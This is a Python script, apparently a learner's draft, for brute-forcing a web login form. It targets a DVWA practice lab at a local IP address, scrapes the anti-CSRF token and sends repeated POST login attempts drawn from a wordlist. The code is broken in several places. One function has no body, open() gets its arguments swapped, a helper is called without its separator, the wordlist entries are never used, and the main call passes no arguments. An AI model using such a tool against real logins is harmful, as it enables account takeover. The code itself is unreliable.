from bs4 import BeautifulSoup
import requests
import re
import sys
import getopt
import re

def obter_token(url, name_keyword="token"):
    try:
        # Fazendo a requisição GET para a URL
        response = requests.get(url)
        response.raise_for_status()  # Lança uma exceção para erros HTTP
        
        # Criando um objeto BeautifulSoup para analisar o conteúdo HTML da página
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Encontrando todos os elementos com o atributo 'name' que contenham a palavra-chave
        elements_with_name = soup.find_all(attrs={'name': re.compile(name_keyword)})
        
        # Verificando se algum elemento foi encontrado
        if elements_with_name:
            # Exibindo o valor dos elementos encontrados (se tiverem)
            for element in elements_with_name:
                # Verifica se o elemento possui o atributo 'value'
                if 'value' in element.attrs:
                    # print(f"Valor do elemento cujo nome contém '{name_keyword}': {element['value']}")
                    return element['value']
                else:
                    # print(f"O elemento cujo nome contém '{name_keyword}' não possui um atributo 'value'.")
                    return None
        else:
            print(f"Nenhum elemento cujo nome contenha '{name_keyword}' encontrado na página.")
    except requests.exceptions.RequestException as e:
        print("Erro ao fazer a requisição:", e)

def formatar_dicionario(string,separator):
    Post_body = {j[0]:j[1] for j in [i.split("=") for i in string.strip().split(separator)]}
    print(Post_body)
    return Post_body

def send_post(url,body,cookies=None):
    try:
        if cookies is not None:
            response = requests.post(url, data=body, cookies=cookies,allow_redirects=True)
        else:
            response = requests.post(url, data=body,allow_redirects=True)
        print(response.status_code)
        print(response.text)
        for i,j in body:print(i,j)

    except Exception as e:
        print(e)

def send_get():
    

def http_brute_force(url,body,cookies=None,wordlist='teste.txt'):
    get_token = False
    token = obter_token(url)
    body = formatar_dicionario(body)
    if cookies is not None:
        cookies = formatar_dicionario(cookies,";")
    if token is not None:
        print(token)
        get_token = True
    print(f"token {token}")
    print(f"cookies {cookies}")
    
    with open('r',wordlist) as file:
        linhas = file.readlines()
        for linha in linhas:
            send_post(url,body,cookies)
            if get_token is True: 
                token = obter_token(url)
                body.update({"user_token":token})
    
# try:
    # opts,args = getopt.getopt(sys[1:],'u:w:b:c:', ['--url=','--wordlist=','--body=','--cookies'])
    # cookies = None
    # # URL da página da web
    # for a,i in opts:
    #     if a in('-u','--url'):
    #         url = i
    #     elif a in ('-w','--wordlist'):
    #         wordlist = i
    #     elif a in ('-b','--body'):
    #         body = i
    #     elif a in ('-c','--cookies'):
    #         cookies = i
    #     else:
            # raise getopt.GetoptError("Argumentos inválidos")
url = "http://192.168.1.12/dvwa/login.php"
Post_body = "username=$USER&password=$PASS&Login=Login&user_token=$TOKEN"
cookies = "security=low; PHPSESSID=t4fi6mmsifo4g52knmhtdcole3"
        # Palavra-chave que você deseja encontrar no atributo "name"

        # Chamada da função para obter o valor do elemento pelo nome
        # if cookies is not None:
            # http_brute_force(url,Post_body,cookies)
# http_brute_force(url,Post_body)
# except:
#     print("Argumentos inválidos")
http_brute_force()